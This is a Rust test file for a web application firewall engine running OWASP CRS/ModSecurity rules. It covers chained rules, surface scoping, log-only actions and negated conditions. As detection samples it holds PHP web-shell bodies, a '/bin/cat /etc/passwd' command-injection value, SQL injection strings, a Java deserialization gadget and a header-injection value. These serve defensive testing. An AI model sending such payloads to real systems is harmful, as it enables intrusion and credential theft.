    /// at the default log level — nothing observable at all.
    ///
    /// That made "start with `action: log`, monitor before blocking", which is
    /// what `rules/README.md` tells rule authors and what an operator means by
    /// downgrading a noisy rule to [`RuleState::LogOnly`], an instruction to
    /// watch silence. The `Log` arm now records a `score 0` contribution, which
    /// reaches the audit log and nothing else: no anomaly score, no verdict, no
    /// block. That distinction is the whole difference between `log` and
    /// `block` and is asserted here in both directions.
    #[test]
    fn log_action_is_recorded_in_the_audit_log_and_never_scores() {
        let ctx = probe("GET", "/anything", "", &[], "", 1);

        let (logging, mut worker) = audited(&PROBE_RULE.replace("ACTION", "log"));
        assert_eq!(logging.rule_count(), 1, "the log rule is loaded and enforced");
        assert!(
            logging.check(&ctx).is_none(),
            "a `critical` rule with action=log must not block — it contributes no score"
        );
        let recorded = worker.drain_to_string();
        assert!(
            recorded.contains("[ref \"PROBE-001\"]"),
            "an action=log match must reach the audit log — that is what makes it an observation \
             mode rather than silence: {recorded}"
        );
        assert!(
            recorded.contains("[score \"0\"]"),
            "a log-only match contributes nothing: {recorded}"
        );
        assert!(
            !recorded.contains("[id \"949110\"]"),
            "nothing was blocked, so no blocking-evaluation line: {recorded}"
        );

        // The identical rule with `action: block` does reach the threshold, so
        // the rule and the request are not the reason nothing happened.
        let blocking =
            OWASPCheck::from_yaml(&PROBE_RULE.replace("ACTION", "block")).with_config(&OwaspConfig::default());
        assert!(
            blocking.check(&ctx).is_some(),
            "the same rule with action=block blocks, so `log` is what silenced it"
        );
    }

    /// `rules/modsecurity/response-checks.yaml` describes response bodies.  It
    /// is not on the load path today, but if it ever is, none of it may run
    /// against a request: MODSEC-RESP-006 alone would block every form POST
    /// carrying an `api_key=` parameter.
    ///
    /// Since the response phase was wired these rules *compile* — what must
    /// stay true is that they compile into the response pipeline and nothing
    /// puts them in front of a request. That is a stronger property than the
    /// rejection this used to assert, and the request probes below are what
    /// actually prove it.
    #[test]
    fn shipped_response_checks_are_inert_and_response_phase() {
        let path = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/modsecurity/response-checks.yaml");
        let checker = OWASPCheck::from_file_or_default(&path);
        let summary = checker.load_summary();

        assert_eq!(summary.attempted, 12, "declared response-phase rules");
        assert_eq!(summary.compiled, 12, "every one of them is evaluable now");
        assert_eq!(
            checker.request_rule_count(),
            0,
            "no response-phase rule may be enforced on a request"
        );
        assert_eq!(checker.response_rule_count(), 12);

        for (label, ctx) in [
            (
                "form POST carrying an api key",
                probe(
                    "POST",
                    "/settings",
                    "",
                    &[("content-type", "application/x-www-form-urlencoded")],
                    "api_key=abc123&app_key=def456",
                    1,
                ),
            ),
            (
                "git config pasted into a note",
                probe(
                    "POST",
                    "/api/notes",
                    "",
                    &[],
                    "[core]\n\trepositoryformatversion = 0\n",
                    1,
                ),
            ),
            (
                "python traceback in a bug report",
                probe(
                    "POST",
                    "/api/bugs",
                    "",
                    &[],
                    "Traceback (most recent call last):\n  File \"app.py\", line 3",
                    2,
                ),
            ),
        ] {
            assert!(checker.check(&ctx).is_none(), "{label} must not be blocked");
        }
    }

    // ── Surface fields ────────────────────────────────────────────────────────

    #[test]
    fn surface_lists_parse_in_any_order_and_reject_junk() {
        assert_eq!(Field::parse("all"), Some(Field::Multi(Surfaces::ALL)));
        assert_eq!(Field::parse("query+body"), Field::parse("body+query"));
        assert_eq!(
            Field::parse("path+query+body+cookies+headers"),
            Some(Field::Multi(Surfaces::ALL)),
            "the full surface list is exactly `all`"
        );
        // A repeated or unknown surface is a typo, not a narrower rule.
        assert_eq!(Field::parse("query+query"), None);
        assert_eq!(Field::parse("query+banana"), None);
        assert_eq!(Field::parse("query+"), None);
        // A sentinel field is never accepted, whatever variable it names.
        for sentinel in [
            "unmapped_files",
            "unmapped_multipart_part_headers",
            "unmapped_count_request_headers_range",
            "unmapped_chained_capture_equality",
        ] {
            assert_eq!(Field::parse(sentinel), None, "{sentinel} must stay unevaluable");
        }
    }

    #[test]
    fn a_surface_list_scans_only_the_surfaces_it_names() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query+cookies", "contains", "'needle'"));
        assert_eq!(checker.rule_count(), 1);

        assert!(
            checker.check(&probe("GET", "/", "a=needle", &[], "", 1)).is_some(),
            "query"
        );
        assert!(
            checker
                .check(&probe("GET", "/", "", &[("cookie", "x=needle")], "", 1))
                .is_some(),
            "cookies"
        );
        // Surfaces the field does not name must be left alone.
        assert!(
            checker.check(&probe("GET", "/needle", "", &[], "", 1)).is_none(),
            "path"
        );
        assert!(
            checker.check(&probe("POST", "/", "", &[], "needle", 1)).is_none(),
            "body"
        );
        assert!(
            checker
                .check(&probe("GET", "/", "", &[("x-thing", "needle")], "", 1))
                .is_none(),
            "header value"
        );
    }

    #[test]
    fn user_agent_and_referer_surfaces_do_not_leak_into_other_headers() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("user_agent+referer", "contains", "'needle'"));
        assert_eq!(checker.rule_count(), 1);

        for header in ["user-agent", "referer"] {
            assert!(
                checker
                    .check(&probe("GET", "/", "", &[(header, "needle")], "", 1))
                    .is_some(),
                "{header} must be scanned"
            );
        }
        for header in ["accept", "x-forwarded-for", "cookie"] {
            assert!(
                checker
                    .check(&probe("GET", "/", "", &[(header, "needle")], "", 1))
                    .is_none(),
                "{header} must not be scanned"
            );
        }
    }

    /// Regression guard for the response-phase mislabelling: these bodies are
    /// ordinary application traffic (bug reports, error-reporting payloads,
    /// CMS content) that the `response-*.yaml` rules used to block outright
    /// because they were tagged `field: body`.
    #[test]
    fn response_phase_patterns_do_not_block_ordinary_request_bodies() {
        let checker = OWASPCheck::from_directory(&crs_dir());

        // Paranoia 1 (the shipped default).
        for body in [
            // php-errors.data phrases — short strings that occur in prose.
            "note=we call SQLBindCol here",
            "report=Got chunk while reading",
            // asp-dotnet-errors.data phrase.
            "msg=Invalid XBM file",
            // web-shells-php.data phrase that is the name of legitimate
            // open-source software.
            "html=<title>Tiny File Manager</title>",
            // A stack trace POSTed to an error-reporting endpoint.
            "err=java.sql.SQLException: connection refused",
            // CRS-950140 `^#!\s?/` — any script or config upload.
            "#!/x",
        ] {
            assert!(
                checker.check(&make_ctx_with_body(body, 1)).is_none(),
                "PL1 must not block ordinary request body: {body}"
            );
        }

        // Paranoia 2 additionally enabled the Ruby and IIS leakage rules.
        for body in ["tpl=hello #{name}", "path=c:/inetpub/logs"] {
            assert!(
                checker.check(&make_ctx_with_body(body, 2)).is_none(),
                "PL2 must not block ordinary request body: {body}"
            );
        }

        // CRS-950100 tests RESPONSE_STATUS `^5\d{2}$`; while it carried
        // `field: all` it matched the request's own `Content-Length` header,
        // so every PL2 request with a 500..599-byte body was blocked.
        let mut ctx = make_ctx_with_body("hello", 2);
        ctx.headers.insert("content-length".into(), "512".into());
        assert!(
            checker.check(&ctx).is_none(),
            "a 512-byte request body is not a 5xx response status"
        );
    }

    /// Disabling the response-phase web-shell rules must not lose request-phase
    /// web-shell *upload* detection: the CRS 933 PHP-injection rules already
    /// cover it, and they run against the request's parameters.
    ///
    /// *Parameters*, not "the body": the 933 rules name
    /// `REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/*` upstream
    /// and no `REQUEST_BODY`, so the shell has to arrive somewhere a body
    /// processor turns into a parameter. Both spellings below do — a urlencoded
    /// body with no `=` in it is one `ARGS` member whose *name* is the whole
    /// payload, which is exactly what upstream's URLENCODED processor makes of
    /// it — and that is the surface the rule reads. A body sent with no
    /// `Content-Type` at all populates only `REQUEST_BODY`, upstream included;
    /// that gap is CRS's, not this engine's, and pretending otherwise is what
    /// the `XML:/*` mis-mapping used to do.
    #[test]
    fn php_webshell_upload_is_still_detected_in_the_request_phase() {
        let checker = OWASPCheck::from_directory(&crs_dir());

        for body in [
            "<?php\n$auth_pass=\"\";\necho \"<title>r57 shell</title>\";\n@eval($_POST['cmd']);\n",
            "<?php system($_GET['c']); ?>",
        ] {
            let mut ctx = make_ctx_with_body(body, 1);
            ctx.headers
                .insert("content-type".into(), "application/x-www-form-urlencoded".into());
            let hit = checker
                .check(&ctx)
                .unwrap_or_else(|| panic!("web-shell upload must still be detected: {body}"));
            let id = hit.rule_id.unwrap_or_default();
            assert!(
                !id.starts_with("CRS-955"),
                "detection must come from a request-phase rule, not the 955 response set, got {id}"
            );
        }
    }

    /// A representative `pm_from_file` rule from the shipped set actually fires.
    #[test]
    fn shipped_crs_scanner_wordlist_rule_fires() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        // CRS-913100 — scanners-user-agents.data on the User-Agent header.
        let ctx = make_ctx_with_header("user-agent", "sqlmap/1.7#stable (http://sqlmap.org)");
        let hit = checker.check(&ctx);
        assert!(
            hit.is_some(),
            "a known scanner UA must be detected by the shipped rules"
        );
    }
    // ── Chained rules (ModSecurity `chain`) ──────────────────────────────────

    /// Evaluate one shipped rule by id, ignoring the paranoia gate.
    ///
    /// The point of these tests is the rule's own semantics; whether the host
    /// runs at PL1 or PL2 is a separate policy question, and several of the
    /// chained rules are PL2.
    fn fires(checker: &OWASPCheck, id: &str, ctx: &RequestCtx) -> bool {
        checker
            .rules
            .iter()
            .find(|r| r.id == id)
            .unwrap_or_else(|| panic!("{id} must be an enforced rule"))
            .matches(&RequestView::new(ctx))
    }

    /// Ordinary traffic that every chained rule used to block, because only
    /// the rule's *first* condition survived the conversion.
    ///
    /// Each entry names the rule that blocked it and the condition that was
    /// missing.  These are the regressions the `chain:` schema exists to fix.
    #[test]
    fn chained_rules_do_not_block_ordinary_traffic() {
        let checker = OWASPCheck::from_directory(&crs_dir());

        let cases: Vec<(&str, RequestCtx)> = vec![
            // CRS-944110's first condition is `@rx (?:runtime|processbuilder)`.
            // Alone it blocked every request that so much as mentions the word;
            // the chained condition requires the *same* value to also contain
            // `unmarshaller|base64data|java.`.
            (
                "944110: java runtime mentioned in a log payload",
                probe(
                    "POST",
                    "/api/logs",
                    "",
                    &[("content-type", "application/json")],
                    "{\"msg\":\"java runtime version 17.0.9 started\"}",
                    1,
                ),
            ),
            (
                "944110: 'runtime' as a documentation query",
                probe("GET", "/docs", "topic=runtime", &[], "", 1),
            ),
            (
                "944110: ProcessBuilder named in a trace header",
                probe("GET", "/", "", &[("x-trace", "processbuilder")], "", 1),
            ),
            // CRS-944120 is the same shape with the gadget list first.
            (
                "944120: gadget class name in prose without a spawn call",
                probe("POST", "/api/notes", "", &[], "note=InvokerTransformer explained", 1),
            ),
            // CRS-932205/6/7 first conditions match *any* Referer
            // (`^[^#]+`, `#.*`), so a plain product link was a 403.
            (
                "932205/932206: ordinary Referer",
                probe(
                    "GET",
                    "/p",
                    "",
                    &[("referer", "https://shop.example.com/products?page=2")],
                    "",
                    2,
                ),
            ),
            (
                "932207: Referer carrying a fragment",
                probe(
                    "GET",
                    "/p",
                    "",
                    &[("referer", "https://shop.example.com/docs#section-2")],
                    "",
                    2,
                ),
            ),
            (
                "932207: scroll-to-text fragment",
                probe(
                    "GET",
                    "/p",
                    "",
                    &[("referer", "https://shop.example.com/docs#:~:text=hello")],
                    "",
                    2,
                ),
            ),
            // CRS-920200 exempts PDF viewers, which legitimately ask for many
            // ranges; without the chained condition every one was blocked.
            (
                "920200: multi-range PDF fetch",
                probe(
                    "GET",
                    "/docs/manual.pdf",
                    "",
                    &[("range", "bytes=0-1,1-2,2-3,3-4,4-5,5-6,6-7")],
                    "",
                    2,
                ),
            ),
            // CRS-933150 matches PHP function *names*; the chained condition
            // requires a parenthesis, i.e. an actual call.
            (
                "933150: PHP function name in prose",
                probe(
                    "POST",
                    "/api/notes",
                    "",
                    &[],
                    "note=we replaced array_map with a loop",
                    1,
                ),
            ),
            // CRS-932200's first condition matches a quote followed by a path;
            // the chain requires the same value to hold a slash *and*
            // whitespace, i.e. a command line.
            (
                "932200: relative redirect target in a query argument",
                probe("GET", "/login", "next=/account/settings?tab=billing", &[], "", 2),
            ),
            // CRS-943110/943120 only mean "session id in the URL *and* an
            // off-domain / absent Referer".
            (
                "943110: session id parameter with a same-origin Referer",
                probe(
                    "GET",
                    "/x",
                    "phpsessid",
                    &[("referer", "https://example.com/a"), ("host", "example.com")],
                    "",
                    1,
                ),
            ),
            (
                "943120: session id parameter with a Referer present",
                probe(
                    "GET",
                    "/x",
                    "phpsessid",
                    &[("referer", "https://example.com/a"), ("host", "example.com")],
                    "",
                    1,
                ),
            ),
            // CRS-931130 is refused outright (its chain reads a `setvar`
            // collection): its first condition alone blocked every OAuth
            // redirect and every absolute URL in a query argument.
            (
                "931130: absolute URL in an OAuth redirect parameter",
                probe(
                    "GET",
                    "/oauth/authorize",
                    "redirect_uri=https://app.example.com/cb&state=xyz",
                    &[("host", "example.com")],
                    "",
                    2,
                ),
            ),
            // CRS-942130 is refused outright (see the converter's
            // `args_self_equality` note): its capture-equality test reads the
            // query string's own `name=value` separator as a tautology.
            (
                "942130: a parameter whose value equals its name",
                probe("GET", "/s", "tab=tab", &[], "", 2),
            ),
        ];

        for (label, ctx) in &cases {
            assert!(
                checker.check(ctx).is_none(),
                "{label} must not be blocked, got {:?}",
                checker.check(ctx).and_then(|d| d.rule_id)
            );
        }
    }

    /// What each chained rule is actually for must still be caught — by that
    /// very rule, not incidentally by a neighbour.
    #[test]
    fn chained_rules_still_detect_their_attacks() {
        let checker = OWASPCheck::from_directory(&crs_dir());

        let cases: Vec<(&str, RequestCtx)> = vec![
            (
                "CRS-944110",
                probe(
                    "POST",
                    "/struts",
                    "",
                    &[("content-type", "application/xml")],
                    "<map><jdk.nashorn.internal.objects.NativeString><value \
                     class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\">",
                    1,
                ),
            ),
            // Lower-case on purpose: upstream CRS applies `t:lowercase` to
            // this rule and this engine implements no transformation pipeline,
            // so `InvokerTransformer` as written in a Java class name is not
            // matched.  That gap predates chaining and is tracked separately.
            (
                "CRS-944120",
                probe(
                    "POST",
                    "/api",
                    "",
                    &[("content-type", "application/xml")],
                    "org.apache.commons.collections.functors.invokertransformer runtime",
                    1,
                ),
            ),
            (
                "CRS-932206",
                probe("GET", "/", "", &[("referer", "x';id /tmp'")], "", 2),
            ),
            (
                "CRS-920200",
                probe(
                    "GET",
                    "/img/tile.png",
                    "",
                    &[("range", "bytes=0-1,1-2,2-3,3-4,4-5,5-6,6-7")],
                    "",
                    2,
                ),
            ),
            (
                "CRS-933150",
                probe(
                    "POST",
                    "/api/notes",
                    "",
                    &[("content-type", "application/x-www-form-urlencoded")],
                    "note=array_map('system',$_GET)",
                    1,
                ),
            ),
            (
                "CRS-932200",
                probe(
                    "POST",
                    "/run",
                    "",
                    &[("content-type", "application/x-www-form-urlencoded")],
                    "cmd='/bin/cat /etc/passwd'",
                    2,
                ),
            ),
            ("CRS-942131", probe("GET", "/s", "id=1 or 3>2", &[], "", 2)),
            ("CRS-942521", probe("GET", "/s", "u=admin' or 1", &[], "", 2)),
            (
                "CRS-943110",
                probe(
                    "GET",
                    "/x",
                    "phpsessid",
                    &[("referer", "https://evil.test/a"), ("host", "example.com")],
                    "",
                    1,
                ),
            ),
            (
                "CRS-943120",
                probe("GET", "/x", "phpsessid", &[("host", "example.com")], "", 1),
            ),
        ];

        for (id, ctx) in &cases {
            assert!(fires(&checker, id, ctx), "{id} must still fire on its own attack");

            // Matching and blocking are no longer the same statement. Under the
            // anomaly-score model a lone match blocks only when the rule's
            // severity reaches the threshold by itself. Every rule in this set
            // is `critical` (+5 against a threshold of 5) except CRS-920200,
            // which upstream declares `severity:'WARNING'` (+3) — upstream does
            // not deny on it alone either, it scores it and waits for a second
            // rule. See `evaluate` / `AnomalyScoring::blocks_alone`.
            let expected_block = *id != "CRS-920200";
            assert_eq!(
                checker.check(ctx).is_some(),
                expected_block,
                "{id}: a lone match must block iff its severity reaches the threshold on its own"
            );
        }

        // Pin the reason CRS-920200 is the exception, so a severity change in
        // the rule file cannot quietly turn this into "the engine regressed".
        let range_rule = checker
            .rules
            .iter()
            .find(|r| r.id == "CRS-920200")
            .expect("CRS-920200 must be an enforced rule");
        assert_eq!(range_rule.severity, Severity::Warning);
        assert!(!checker.scoring.blocks_alone(Severity::Warning));
    }

    /// A chain stops at the first condition that fails, and the whole rule is
    /// silent unless every condition holds.
    #[test]
    fn chain_requires_every_condition() {
        let yaml = r#"
version: "1.0"
rules:
  - id: TEST-CHAIN
    name: chained rule
    category: test
    severity: critical
    paranoia: 1
    field: query
    operator: contains
    value: alpha
    chain:
      - field: query
        operator: contains
        value: beta
      - field: header_referer
        operator: contains
        value: gamma
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1);

        let all = probe("GET", "/", "alpha+beta", &[("referer", "gamma")], "", 1);
        assert!(checker.check(&all).is_some(), "every condition holds");

        for (label, ctx) in [
            ("head fails", probe("GET", "/", "beta", &[("referer", "gamma")], "", 1)),
            (
                "link 0 fails",
                probe("GET", "/", "alpha", &[("referer", "gamma")], "", 1),
            ),
            ("link 1 fails", probe("GET", "/", "alpha+beta", &[], "", 1)),
        ] {
            assert!(checker.check(&ctx).is_none(), "{label}: chain must not fire");
        }
    }

    /// `matched_value` is the value the previous condition matched, not the
    /// whole request: a second condition satisfied by a *different* surface
    /// must not complete the chain.
    #[test]
    fn matched_value_is_scoped_to_the_value_that_matched() {
        let yaml = r#"
version: "1.0"
rules:
  - id: TEST-MATCHED
    name: matched value chain
    category: test
    severity: critical
    paranoia: 1
    field: query+body
    operator: contains
    value: runtime
    chain:
      - field: matched_value
        operator: contains
        value: java
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1);

        let same = probe("POST", "/", "", &[], "java.runtime.exec", 1);
        assert!(checker.check(&same).is_some(), "one value satisfies both conditions");

        // `runtime` in the query, `java` in the body: two different values, so
        // the chain must stay silent.  A naive "re-scan the whole request"
        // implementation would fire here.
        let split = probe("POST", "/", "topic=runtime", &[], "a java tutorial", 1);
        assert!(checker.check(&split).is_none(), "different values must not combine");
    }

    /// `matched_value` carries the *decoded* form when the match was made on
    /// one, mirroring `ModSecurity` `MATCHED_VARS` holding the transformed
    /// value.
    #[test]
    fn matched_value_carries_the_decoded_form() {
        let yaml = r#"
version: "1.0"
rules:
  - id: TEST-DECODED
    name: decoded matched value
    category: test
    severity: critical
    paranoia: 1
    field: query
    operator: contains_any
    value: 'system'
    chain:
      - field: matched_value
        operator: contains
        value: '('
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        let ctx = probe("GET", "/", "cmd=%73ystem%28id%29", &[], "", 1);
        assert!(
            checker.check(&ctx).is_some(),
            "the chain must see the urlDecoded text the phrase matched"
        );
    }

    /// `tx:N` reads the capture groups of the last capturing condition, and
    /// `%{TX.N}` expands one on the right-hand side.
    #[test]
    fn captures_are_bound_and_comparable() {
        let yaml = r#"
version: "1.0"
rules:
  - id: TEST-CAPTURE
    name: capture equality
    category: test
    severity: critical
    paranoia: 1
    field: query
    operator: regex
    value: '([a-z]+)=([a-z]+)'
    capture: true
    chain:
      - field: tx:1
        operator: equals
        value: '%{TX.2}'
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1);
        assert!(
            checker.check(&probe("GET", "/", "same=same", &[], "", 1)).is_some(),
            "identical captures must fire"
        );
        assert!(
            checker.check(&probe("GET", "/", "left=right", &[], "", 1)).is_none(),
            "different captures must not fire"
        );
    }

    /// `%{REQUEST_HEADERS.HOST}` expands to the request's `Host` header, and a
    /// request without one must not satisfy the *negated* comparison — the
    /// failure mode that would block every `Host`-less request.
    #[test]
    fn host_macro_expands_and_an_absent_host_never_matches() {
        let yaml = r#"
version: "1.0"
rules:
  - id: TEST-HOST
    name: off-domain referer
    category: test
    severity: critical
    paranoia: 1
    field: header_referer
    operator: regex
    value: '^https?://([^/]*)/'
    capture: true
    chain:
      - field: tx:1
        operator: ends_with
        value: '%{request_headers.host}'
        negate: true
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1);

        let off_domain = probe(
            "GET",
            "/",
            "",
            &[("referer", "https://evil.test/a"), ("host", "example.com")],
            "",
            1,
        );
        assert!(checker.check(&off_domain).is_some(), "off-domain referer fires");

        let same_domain = probe(
            "GET",
            "/",
            "",
            &[("referer", "https://example.com/a"), ("host", "example.com")],
            "",
            1,
        );
        assert!(checker.check(&same_domain).is_none(), "same-origin referer is fine");

        let no_host = probe("GET", "/", "", &[("referer", "https://example.com/a")], "", 1);
        assert!(
            checker.check(&no_host).is_none(),
            "an unexpandable macro must not satisfy a negated condition"
        );
    }

    /// The same three-state guarantee at the **head** of a rule, which is where
    /// negation now arrives from the converter.
    ///
    /// [`Condition::matches_any`] is a separate code path from
    /// [`Condition::advance`], so "an unexpandable `%{...}` is not a match" has
    /// to be pinned on both. A head that reads `!@endsWith
    /// %{request_headers.host}` on a request carrying no `Host` would otherwise
    /// hold for every value of the surface and block the request outright —
    /// [`Outcome::Unresolvable`] exists precisely so `NoMatch` and "could not be
    /// compared" are not the same answer under `negate`.
    #[test]
    fn a_negated_head_never_fires_on_an_unexpandable_macro() {
        let yaml = r#"
version: "1.0"
rules:
  - id: TEST-NEG-HEAD
    name: referer is off-host
    category: test
    severity: critical
    paranoia: 1
    field: header_referer
    operator: ends_with
    value: '%{request_headers.host}'
    negate: true
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1);

        let off_host = probe(
            "GET",
            "/",
            "",
            &[("referer", "https://evil.test"), ("host", "example.com")],
            "",
            1,
        );
        assert!(checker.check(&off_host).is_some(), "an off-host referer still fires");

        let same_host = probe(
            "GET",
            "/",
            "",
            &[("referer", "https://example.com"), ("host", "example.com")],
            "",
            1,
        );
        assert!(checker.check(&same_host).is_none(), "a same-host referer is fine");

        let no_host = probe("GET", "/", "", &[("referer", "https://example.com")], "", 1);
        assert!(
            checker.check(&no_host).is_none(),
            "an unexpandable macro must not satisfy a negated HEAD condition"
        );
    }

    /// A negated head reads nothing at all when the request does not carry the
    /// variable, which is what keeps `!@rx` rules off ordinary traffic.
    ///
    /// `ModSecurity` does not evaluate a rule whose target is absent, so
    /// CRS-920470 ("Illegal Content-Type header") says nothing about a request
    /// that sends no `Content-Type`. Mapping "absent" onto an empty string
    /// instead would invert that: the empty string fails the media-type
    /// pattern, the negation would hold, and every GET a browser makes would
    /// score a CRITICAL. The scalar accessor returning `None` is what makes
    /// this structural rather than incidental.
    #[test]
    fn a_negated_head_reads_nothing_when_the_header_is_absent() {
        let checker = crs_checker();
        let hit = |headers: &[(&str, &str)]| {
            checker
                .check(&probe("POST", "/upload", "", headers, "a=1", 1))
                .map(|d| d.detail)
        };

        // Nothing to test — CRS-920470 cannot reach this request.
        assert_eq!(hit(&[]), None, "a request with no Content-Type is not judged");

        // The media types real clients send, none of which may be flagged.
        for legal in [
            "application/x-www-form-urlencoded",
            "application/json",
            "application/json; charset=utf-8",
            "application/json;charset=UTF-8",
            "text/html; charset=ISO-8859-1",
            "multipart/form-data; boundary=----WebKitFormBoundaryB1oJ2Kd9x",
            "application/vnd.api+json",
            "image/svg+xml",
            "application/grpc-web+proto",
            "text/plain",
        ] {
            assert_eq!(hit(&[("content-type", legal)]), None, "{legal} is a legal media type");
        }

        // And what the rule is actually for: a header that is not a media type.
        for illegal in ["application/json, text/html", "*/*; q=0.5\r\nX-Injected: 1"] {
            let detail = hit(&[("content-type", illegal)]).unwrap_or_default();
            assert!(detail.contains("920470"), "{illegal} must be flagged, got {detail:?}");
        }
    }

    /// `count_header_<name>` is a presence test, and only `0`/`1` targets are
    /// accepted — anything else could never be reached.
    #[test]
    fn header_count_is_presence_only() {
        let yaml = |value: &str| {
            format!(
                "version: \"1.0\"\nrules:\n  - id: TEST-COUNT\n    name: t\n    category: test\n    \
                 severity: critical\n    paranoia: 1\n    field: count_header_referer\n    \
                 operator: equals\n    value: '{value}'\n    action: block\n"
            )
        };
        let checker = OWASPCheck::from_yaml(&yaml("0"));
        assert_eq!(checker.rule_count(), 1);
        assert!(checker.check(&probe("GET", "/", "", &[], "", 1)).is_some(), "absent");
        assert!(
            checker
                .check(&probe("GET", "/", "", &[("referer", "http://x/")], "", 1))
                .is_none(),
            "present"
        );

        let unreachable = OWASPCheck::from_yaml(&yaml("2"));
        assert_eq!(unreachable.rule_count(), 0, "a count of 2 is not reachable");
        assert_eq!(unreachable.load_summary().count(RejectCategory::InvalidValue), 1);

        // Only headers the engine can read may be counted.
        let unknown = OWASPCheck::from_yaml(&single_rule_yaml("count_header_accept", "equals", "'0'"));
        assert_eq!(unknown.rule_count(), 0);
        assert_eq!(unknown.load_summary().rejected_field_count(), 1);
    }

    /// A chain condition the engine cannot compile drops the whole rule and
    /// says which link failed — it never degrades to "run what compiled".
    #[test]
    fn unusable_chain_condition_rejects_the_whole_rule() {
        let rule = |link: &str| {
            format!(
                "version: \"1.0\"\nrules:\n  - id: TEST-BAD-CHAIN\n    name: t\n    category: test\n    \
                 severity: critical\n    paranoia: 1\n    field: query\n    operator: contains\n    \
                 value: alpha\n    chain:\n{link}    action: block\n"
            )
        };

        // Unsupported field in a link.
        let bad_field = OWASPCheck::from_yaml(&rule(
            "      - field: response_headers\n        operator: contains\n        value: x\n",
        ));
        assert_eq!(bad_field.rule_count(), 0);
        assert_eq!(bad_field.load_summary().count(RejectCategory::Chain), 1);

        // Unsupported operator in a link.
        let bad_op = OWASPCheck::from_yaml(&rule(
            "      - field: query\n        operator: verify_cc\n        value: x\n",
        ));
        assert_eq!(bad_op.rule_count(), 0);
        assert_eq!(bad_op.load_summary().count(RejectCategory::Chain), 1);
        assert_eq!(
            bad_op.load_summary().rejected_operator_count(),
            0,
            "a chain failure is reported as a chain failure"
        );

        // `tx:1` with nothing capturing before it can never match.
        let unbound = OWASPCheck::from_yaml(&rule(
            "      - field: tx:1\n        operator: contains\n        value: x\n",
        ));
        assert_eq!(unbound.rule_count(), 0);
        assert!(matches!(
            unbound.load_summary().rejected.first().map(|r| &r.reason),
            Some(RejectReason::UnresolvedCapture { index: 1, .. })
        ));

        // `%{TX.3}` with nothing capturing before it, likewise.
        let unbound_macro = OWASPCheck::from_yaml(&rule(
            "      - field: query\n        operator: equals\n        value: '%{TX.3}'\n",
        ));
        assert_eq!(unbound_macro.rule_count(), 0);
        assert_eq!(unbound_macro.load_summary().count(RejectCategory::Chain), 1);

        // `capture` on a non-regex operator promises bindings it cannot make.
        let bad_capture = OWASPCheck::from_yaml(
            "version: \"1.0\"\nrules:\n  - id: TEST-BAD-CAPTURE\n    name: t\n    category: test\n    \
             severity: critical\n    paranoia: 1\n    field: query\n    operator: contains\n    \
             value: alpha\n    capture: true\n    action: block\n",
        );
        assert_eq!(bad_capture.rule_count(), 0);
        assert!(matches!(
            bad_capture.load_summary().rejected.first().map(|r| &r.reason),
            Some(RejectReason::CaptureWithoutRegex { .. })
        ));

        // An unexpandable macro is rejected rather than compared literally.
        let bad_macro = OWASPCheck::from_yaml(&single_rule_yaml("query", "equals", "'%{tx.crs_setup_version}'"));
        assert_eq!(bad_macro.rule_count(), 0);
        assert_eq!(bad_macro.load_summary().count(RejectCategory::InvalidValue), 1);
    }

    /// The head pseudo-fields are chain-only: a rule whose *head* reads
    /// `matched_value` or `tx:N` has nothing to read from.
    #[test]
    fn chain_pseudo_fields_are_not_valid_as_a_head() {
        for field in ["matched_value", "tx:0"] {
            let checker = OWASPCheck::from_yaml(&single_rule_yaml(field, "contains", "x"));
            assert_eq!(checker.rule_count(), 0, "{field} must not be a head field");
            assert_eq!(checker.load_summary().rejected_field_count(), 1);
        }
    }

    /// `negate` is per-value: the condition holds when *some* value fails the
    /// matcher, which is what `ModSecurity` `!@op` means on a collection.
    #[test]
    fn negate_holds_when_a_value_fails_the_matcher() {
        let checker = OWASPCheck::from_yaml(
            "version: \"1.0\"\nrules:\n  - id: TEST-NEG\n    name: t\n    category: test\n    \
             severity: critical\n    paranoia: 1\n    field: path\n    operator: ends_with\n    \
             value: .pdf\n    negate: true\n    action: block\n",
        );
        assert_eq!(checker.rule_count(), 1);
        assert!(checker.check(&make_ctx("GET", "/a/b.png", 0)).is_some());
        assert!(checker.check(&make_ctx("GET", "/a/b.pdf", 0)).is_none());
    }

    // ── Surface-scoped percent-decoding ──────────────────────────────────────
    //
    // ModSecurity hands CRS an already-decoded `ARGS` / `REQUEST_COOKIES` /
    // `REQUEST_FILENAME`, so every pattern operator has to see the decoded
    // forms of those surfaces or the whole rule set is bypassed by sending the
    // payload percent-encoded.  `REQUEST_HEADERS` is the exception upstream
    // leaves raw, and these tests pin both halves of that split.

    /// One end-to-end request shape, benign or hostile.
    struct Probe {
        label: &'static str,
        method: &'static str,
        path: &'static str,
        query: &'static str,
        body: &'static str,
        headers: &'static [(&'static str, &'static str)],
    }

    const BROWSER: &[(&str, &str)] = &[
        (
            "user-agent",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
        ),
        (
            "accept",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        ),
        ("accept-language", "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"),
        ("accept-encoding", "gzip, deflate, br"),
        ("host", "shop.example.com"),
    ];

    const FORM_POST: &[(&str, &str)] = &[
        ("content-type", "application/x-www-form-urlencoded"),
        ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
        ("host", "shop.example.com"),
    ];

    fn probe_ctx(p: &Probe, paranoia: u8) -> RequestCtx {
        let mut ctx = make_ctx(p.method, p.path, p.body.len() as u64);
        ctx.query = p.query.into();
